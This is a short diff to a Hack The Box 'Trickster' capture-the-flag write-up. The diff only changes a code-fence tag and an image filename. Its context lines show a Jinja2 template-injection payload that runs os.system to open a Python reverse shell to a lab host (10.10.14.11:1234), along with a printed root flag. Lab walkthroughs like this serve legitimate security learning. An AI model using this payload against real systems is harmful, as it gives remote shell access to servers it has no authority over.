@@ -198,7 +198,7 @@ This CVE show that the notification which can run Jinja2 code will run and send 
 
 So we add my website to monitoring list and host a simple python server and add Jinja2 code to send reverse shell to my kali
 
-```console
+```python
 {{ self.__init__.__globals__.__builtins__.__import__('os').system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'') }}
 ```
 
@@ -306,7 +306,7 @@ The root flag is ```96320d5777db52741436c668e47c94c8```
 
 # Box Rooted 
 
-![image](https://raw.githubusercontent.com/ficstkeyfx/ficstkeyfx.github.io/refs/heads/main/.github/images/20241023_trickster_boxroot.png)
+![image](https://raw.githubusercontent.com/ficstkeyfx/ficstkeyfx.github.io/refs/heads/main/.github/images/20241025_trickster_boxroot.png)
 
 <!-- HTB Profile : [ficstkeyfx](https://app.hackthebox.com/profile/244565) -->
 
